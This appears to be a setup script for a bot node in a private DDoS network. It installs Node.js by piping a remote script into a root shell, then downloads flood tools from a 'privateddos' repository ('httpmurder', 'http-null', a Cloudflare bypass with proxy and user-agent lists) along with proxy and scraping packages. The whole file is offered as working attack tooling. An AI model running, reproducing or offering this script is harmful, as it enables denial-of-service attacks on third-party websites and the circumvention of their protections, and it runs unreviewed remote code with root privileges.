curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs
apt-get install -y npm
wget https://raw.githubusercontent.com/xMar-O/privateddos/main/slave/stopdos.sh
wget https://raw.githubusercontent.com/xMar-O/privateddos/main/slave/cloudflarebypass/cfbypass.js
wget https://raw.githubusercontent.com/xMar-O/privateddos/main/slave/cloudflarebypass/proxies.txt
wget https://raw.githubusercontent.com/xMar-O/privateddos/main/slave/cloudflarebypass/ua.txt
wget https://raw.githubusercontent.com/xMar-O/privateddos/main/slave/httpmurder/murder.js
wget https://raw.githubusercontent.com/xMar-O/privateddos/main/slave/httpmurder/murder.txt
wget https://raw.githubusercontent.com/xMar-O/privateddos/main/slave/rawhttpnull/http-null.js
npm init -y
npm install cloudscraper randomstring socks-proxy-agent request
